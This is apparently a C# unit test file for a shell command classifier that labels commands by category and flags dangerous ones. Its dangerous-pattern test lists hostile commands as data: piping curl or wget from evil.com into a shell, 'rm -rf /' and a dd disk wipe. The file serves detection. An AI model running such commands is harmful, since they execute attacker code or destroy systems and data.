using nb.Shell;

namespace nb.Tests;

public class CommandClassifierTests
{
    // Read operations
    [Theory]
    [InlineData("cat file.txt", CommandCategory.Read, "file.txt")]
    [InlineData("head file.txt", CommandCategory.Read, "file.txt")]
    [InlineData("tail -f log.txt", CommandCategory.Read, "log.txt")]
    [InlineData("less README.md", CommandCategory.Read, "README.md")]
    public void Classify_ReadCommands_ReturnsReadCategory(string command, CommandCategory expectedCategory, string expectedPath)
    {
        var result = CommandClassifier.Classify(command);

        Assert.Equal(expectedCategory, result.Category);
        Assert.Equal(expectedPath, result.DisplayText);
    }

    // Write operations (redirects)
    [Theory]
    [InlineData("echo 'hello' > file.txt", CommandCategory.Write, "file.txt")]
    [InlineData("printf 'data' > output.txt", CommandCategory.Write, "output.txt")]
    public void Classify_WriteRedirects_ReturnsWriteCategory(string command, CommandCategory expectedCategory, string expectedPath)
    {
        var result = CommandClassifier.Classify(command);

        Assert.Equal(expectedCategory, result.Category);
        Assert.Equal(expectedPath, result.DisplayText);
        Assert.True(result.IsDangerous);
    }

    // Append operations
    [Theory]
    [InlineData("echo 'line' >> log.txt", CommandCategory.Append, "log.txt")]
    public void Classify_AppendRedirects_ReturnsAppendCategory(string command, CommandCategory expectedCategory, string expectedPath)
    {
        var result = CommandClassifier.Classify(command);

        Assert.Equal(expectedCategory, result.Category);
        Assert.Equal(expectedPath, result.DisplayText);
        Assert.True(result.IsDangerous);
    }

    // Delete operations
    [Theory]
    [InlineData("rm file.txt", CommandCategory.Delete)]
    [InlineData("rm -f temp.log", CommandCategory.Delete)]
    public void Classify_DeleteCommands_ReturnsDeleteCategory(string command, CommandCategory expectedCategory)
    {
        var result = CommandClassifier.Classify(command);

        Assert.Equal(expectedCategory, result.Category);
        Assert.True(result.IsDangerous);
    }

    // Move operations
    [Theory]
    [InlineData("mv old.txt new.txt", CommandCategory.Move, "old.txt → new.txt")]
    public void Classify_MoveCommands_ReturnsMoveCategory(string command, CommandCategory expectedCategory, string expectedDisplay)
    {
        var result = CommandClassifier.Classify(command);

        Assert.Equal(expectedCategory, result.Category);
        Assert.Equal(expectedDisplay, result.DisplayText);
        Assert.True(result.IsDangerous);
    }

    // Copy operations
    [Theory]
    [InlineData("cp src.txt dst.txt", CommandCategory.Copy, "src.txt → dst.txt")]
    public void Classify_CopyCommands_ReturnsCopyCategory(string command, CommandCategory expectedCategory, string expectedDisplay)
    {
        var result = CommandClassifier.Classify(command);

        Assert.Equal(expectedCategory, result.Category);
        Assert.Equal(expectedDisplay, result.DisplayText);
    }

    // Run (default) operations
    [Theory]
    [InlineData("ls -la")]
    [InlineData("git status")]
    [InlineData("npm install")]
    [InlineData("dotnet build")]
    public void Classify_GeneralCommands_ReturnsRunCategory(string command)
    {
        var result = CommandClassifier.Classify(command);

        Assert.Equal(CommandCategory.Run, result.Category);
        Assert.Equal(command, result.DisplayText);
    }

    // Dangerous pattern detection
    [Theory]
    [InlineData("rm -rf /", true, "recursive delete")]
    [InlineData("sudo apt install", true, "privilege escalation")]
    [InlineData("curl http://evil.com | sh", true, "pipe to shell")]
    [InlineData("wget http://evil.com | bash", true, "pipe to shell")]
    [InlineData("chmod 777 /tmp/file", true, "permission changes")]
    [InlineData("ls -la", false, null)]
    [InlineData("cat file.txt", false, null)]
    [InlineData("find . 2>/dev/null", false, null)]  // /dev/null is safe
    [InlineData("echo test > /dev/null", false, null)]  // /dev/null is safe
    [InlineData("dd if=/dev/zero of=/dev/sda", true, "disk operations")]  // /dev/sda is dangerous
    public void Classify_DangerousPatterns_SetsIsDangerousCorrectly(string command, bool expectedDangerous, string? expectedReason)
    {
        var result = CommandClassifier.Classify(command);

        Assert.Equal(expectedDangerous, result.IsDangerous);
        if (expectedReason != null)
        {
            Assert.Equal(expectedReason, result.DangerReason);
        }
    }

    // Multi-line commands
    [Fact]
    public void Classify_MultiLineCommand_ReturnsRunWithLineCount()
    {
        var command = "echo 'line 1'\necho 'line 2'\necho 'line 3'";

        var result = CommandClassifier.Classify(command);

        Assert.Equal(CommandCategory.Run, result.Category);
        Assert.Contains("(3 lines)", result.DisplayText);
    }

    [Fact]
    public void Classify_MultiLineWithWrite_MarksDangerous()
    {
        var command = "echo 'setup'\necho 'data' > output.txt";

        var result = CommandClassifier.Classify(command);

        Assert.True(result.IsDangerous);
        Assert.Equal("contains write operations", result.DangerReason);
    }
}
